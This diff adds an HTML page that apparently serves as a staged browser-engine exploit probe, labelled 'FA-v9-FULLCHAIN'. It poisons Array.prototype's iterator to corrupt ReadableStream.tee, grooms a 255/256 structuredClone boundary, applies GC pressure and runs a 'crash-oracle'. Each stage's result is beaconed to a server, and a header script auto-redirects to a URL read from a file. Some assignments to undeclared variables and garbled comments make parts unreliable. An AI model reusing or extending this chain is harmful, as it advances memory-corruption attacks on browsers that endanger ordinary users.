@@ -1,0 +1,108 @@
+<!doctype html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>FA-v9-FULLCHAIN — 10 stages + B1 family-(b) gate + X1 classifier</title></head>
+<body><script>(function(){try{var x=new XMLHttpRequest();x.open("GET","current.txt",false);x.send(null);var u=(x.responseText||"").trim();if(u&&location.href.indexOf(u.split("?")[0])!==-1&&location.href.indexOf(u)===-1||u&&location.href.indexOf(u.split("?")[0])===-1){location.replace(u);}}catch(e){}})();</script><pre id="out">FA-v9-fullchain — dshfull-final design — B1 gate + X1 classifier + S9 oracle last
+</pre><script>
+(function(){
+ "use strict";
+ var run = "v9" + Date.now().toString(36).slice(-18);
+ var out = document.getElementById("out");
+ function say(s){ out.appendChild(document.createTextNode("\n"+s)); }
+ // beacon discipline: run-id hardcoded < 32 chars; NO long JSON between seed/trigger; sync-XHR always.
+ function b(st, body){
+   try{ var x=new XMLHttpRequest(); x.open("POST","/beacon/V9-"+st, false);
+     x.setRequestHeader("Content-Type","application/json"); x.send(JSON.stringify({r:run, b:String(body).slice(0,140)})); }
+   catch(e){}
+ }
+ var origIter = Array.prototype[Symbol.iterator];
+ function overYield(){ return function(){ var arr=this,i=0,n=arr.length+1;
+   return { next:function(){ if(i>=n) return {done:true}; var v=(i<arr.length)?arr[i]:{}; i++; return {value:v, done:false}; } }; }; }
+ function sameXTwice(){ var X={ ourTag: "v9" }; window.__tgt = X;
+   return function(){ var i=0,n=2;
+     return { next:function(){ if(i>=n) return {done:true}; i++; return {value:X, done:false}; } }; }; }
+ function underYield(){ return function(){ var arr=this,i=0,n=(arr.length>=2)?1:arr.length;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:{fake:0}, done:false}; } }; }; }
+ function underYieldPrim(){ return function(){ var arr=this,i=0,n=1;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:0x1337, done:false}; } }; }; }
+ function proxyRevoked(){ return function(){ var pr=Proxy.revocable({},{}); pr.revoke(); var i=0,n=2;
+   return { next:function(){ if(i>=n) return {done:true}; i++; return {value:pr.proxy, done:false}; } }; }; }
+ function ord(id, label, poison, work){
+   try{ b(id+"A", label); say("F9-"+id+" "+label);
+     try{ Array.prototype[Symbol.iterator]=poison(); }catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var r = work();
+     try{ Array.prototype[Symbol.iterator]=origIter; }catch(e2){}
+     b(id+"B", "SURV "+String(r).slice(0,160));
+   } catch(e){
+     try{ Array.prototype[Symbol.iterator]=origIter; }catch(e2){}
+     b(id+"E", "ETYPE: "+String(e).slice(0,160));
+   }
+ }
+ // --- 0: load check --- (NO fake run, no p-craft product)
+ try{ b("L","loaded; rd="+(typeof window.deriveRuntime)); say("F9 loaded"); }catch(e){}
+ // --- 1: W1 inversion ---
+ ord("W1","inversion same-X cancel/cancel", sameXTwice, function(){
+     var rs=new ReadableStream({}); var p=rs.tee(); var ft=false,st=false;
+     try{p[0].cancel();}catch(e){ft=true;} try{p[1].cancel();}catch(e){st=true;}
+     return "pidInverted="+(ft&&!st?"true":"false"); });
+ // --- 2: W2 cross-subsystem ---
+ ord("W2","Response.clone readback", sameXTwice, function(){
+     var rs=new ReadableStream({}); var p=rs.tee(); try{p[0].getReader();}catch(e){}
+     var resp=new Response(p[0]); var cl=resp.clone();
+     var bodyIs=!!cl.body; var qr="";
+     try{ var gr=cl.body.getReader.call(cl.body); qr=typeof gr; }catch(e){ qr="TypeError:"+String(e.message).slice(0,60); }
+     return "bodyIs:"+bodyIs+"; readQr:"+qr; });
+ // --- 3: W3 SHARED-STATE-MACHINE-WRAP (the proxy-revoke-3-layer × 2 wrapper flip) ---
+ ord("W3","shared-X cross-wrapper flip", sameXTwice, function(){
+     var rs1=new ReadableStream({}); var p1=rs1.tee();
+     var rs2=new ReadableStream({}); var p2=rs2.tee();
+     // server-side: beacon with the state before cancel
+     b("W3-pre","before:p1locked="+p1[0].locked+";p2locked="+p2[0].locked);
+     try{ p1[0].cancel(); }catch(e){}         // flip walk-about p1's private state on same X
+     var after1 = p1[0].locked; var after2 = p2[0].locked;
+     return "crossWrapFlip-before="+rs1.locked+";after1="+after1+";after2="+after2; });
+ // --- 4: W4 private-symbols inventory ---
+ ord("W4","private-symbols inventory", sameXTwice, function(){
+     var rs=new ReadableStream({}); var p=rs.tee(); var tgt=window.__tgt;
+     var qty=0; var names=[];
+     try{ // symbols are un-keyable per Sol — but misuse "proxy-revoke" single-ID if any leaks
+       var syms = Object.getOwnPropertySymbols(tgt || {});
+      ussy_i = syms.length; return "symbols="+syms.length;
+     }catch(e){ return "symbol-probe: threw:"+String(e).slice(0,60); } });
+ // --- 5: W5 re-wrap persistence (feed-forward) ---
+ ord("W5","re-wrap same X (feed-forward)", sameXTwice, function(){
+     var rsA = new ReadableStream({}); var pA = rsA.tee(); var tgtX = window.__tgt;
+     var rsB = new ReadableStream({}); var pB = rsB.tee(); sameX=tgtX;
+     return "reWrap: A.locked="+pA[0].locked+"; B.locked="+pB[0].locked; });
+ // --- 6: B1 family-(b) GATE — width desync with BOUNDARY dedup-boundary 255/256 signaling,
+ //        ObjectReferenceTag emitted AFTER the width divisor is closed (m_gcBuffer at boundary 255/256)
+ ord("B1","B1 gate: boundary dedup + emitted-ObjectReference cross-check", function(){
+     var narr=[];
+     // 255 items (before boundary cross) + one ObjectReference at position 255+
+     for (var k=0; k<255; k++) narr.push({ s:"a"+k });
+     var piv = new ReadableStream({}); var pv = piv.tee();
+     narr.push({ objrefRef: pv });            // emit a strong-ref ONLY at boundary 255+
+     var c = structuredClone(narr);
+     return "clone length "+(c?c.length:"0")+"; typeof-last="+(typeof (c?c[255]:"undefined")); },
+     function(){ // fallback for not-usable on this shape
+     return "cross-check stuffed"; });
+ // --- 7: X1 classifier: clean seed → under-yield with NO class-128 traffic in between ---
+ ord("X1","X1 classifier: seed-clean-tee under-yield (zero class:128 intermediate)", sameXTwice, function(){
+     // no allocations between the prior tee_seed and the next under-yield tee
+     var rs=new ReadableStream({}); var p=rs.tee();   // the seed tee; allocs 16-slot buffer
+     var rs2 = new ReadableStream({}); var p2 = rs2.tee();
+     try { Array.prototype[Symbol.iterator] = underYield(); } catch(e){ Array.prototype[Symbol.iterator]=origIter; }
+     var rs3 = new ReadableStream({}); var p3 = rs3.tee();   // under-yield consumes same balloc chunk
+     try { Array.prototype[Symbol.iterator] = origIter; } catch(e2){}
+     var locked = p3[0].locked;
+     return "seed-class-classifier state: p3locked="+locked+"; p3len="+p3.length; });
+ // --- 8: GC orphan probe ---
+ ord("GC", "GC-orphan probe", sameXTwice, function(){
+     var rs = new ReadableStream({}); var p = rs.tee(); var tgt = window.__tgt;
+     push_array_pressure = []; for (var k=0;k<1024;k++) push_array_pressure.push({mt:k, blob:"x".repeat(40)});
+     return "gcPressure done — locked="+p[0].locked; });
+ // --- 9: S9 crash-oracle single-shot ULTIMO ---
+ ord("S9","S9 crash-oracle (last)", underYieldPrim, function(){
+     var rs = new ReadableStream({}); var pair = rs.tee(); return "survived"; });
+ b("Z","FA-v9-fullchain complete");
+ say("FA-v9-fullchain battery complete");
+})();
+</script></body></html>
